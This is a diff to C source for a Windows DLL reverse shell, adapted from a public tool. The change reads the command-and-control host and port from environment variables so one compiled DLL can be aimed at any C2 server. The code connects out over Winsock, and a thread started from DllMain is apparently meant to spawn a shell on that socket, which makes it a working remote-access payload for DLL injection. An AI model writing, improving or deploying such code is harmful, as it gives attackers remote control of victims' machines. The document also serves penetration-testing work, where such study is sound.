@@ -1,15 +1,31 @@
 #include <winsock2.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <windows.h>
 
 #pragma comment(lib, "ws2_32")
 
-#define HOST "<HOST>"
-#define PORT <PORT>
+/*
+ * Read HOST and PORT from the environment so a single compiled DLL can be
+ * pointed at any C2 without recompiling:
+ *     set REV_HOST=1.2.3.4 && set REV_PORT=4444
+ * Falls back to localhost:4444 if unset.
+ */
+static void GetC2(const char **host, int *port)
+{
+    const char *h = getenv("REV_HOST");
+    char pbuf[16] = "";
+    const char *p = getenv("REV_PORT");
+    if (!h || !*h) h = "127.0.0.1";
+    if (p && *p) { strncpy(pbuf, p, sizeof(pbuf) - 1); pbuf[sizeof(pbuf) - 1] = 0; }
+    else strcpy(pbuf, "4444");
+    *host = h;
+    *port = atoi(pbuf);
+}
 
 WSADATA wsaData;
 SOCKET Winsock;
-SOCKET Sock;
 struct sockaddr_in hax;
 char aip_addr[16];
 STARTUPINFO ini_processo;
@@ -18,16 +34,21 @@ PROCESS_INFORMATION processo_info;
 // Adapted from https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c
 void ReverseShell()
 {
+    const char *host;
+    int port;
+    GetC2(&host, &port);
+
     WSAStartup(MAKEWORD(2, 2), &wsaData);
-    Winsock=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    
-    struct hostent *host = gethostbyname(HOST);
-    strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
-    
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
+    struct hostent *he = gethostbyname(host);
+    if (he && he->h_addr) strcpy(aip_addr, inet_ntoa(*((struct in_addr *)he->h_addr)));
+    else strcpy(aip_addr, host);
+
     hax.sin_family = AF_INET;
-    hax.sin_port = htons(PORT);
+    hax.sin_port = htons((unsigned short)port);
     hax.sin_addr.s_addr = inet_addr(aip_addr);
-    
+
     WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
     if (WSAGetLastError() == 0) {
 
@@ -50,7 +71,7 @@ DWORD WINAPI MainThread(LPVOID lpParam)
     return 0;
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) 
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
     HANDLE hThread;
 
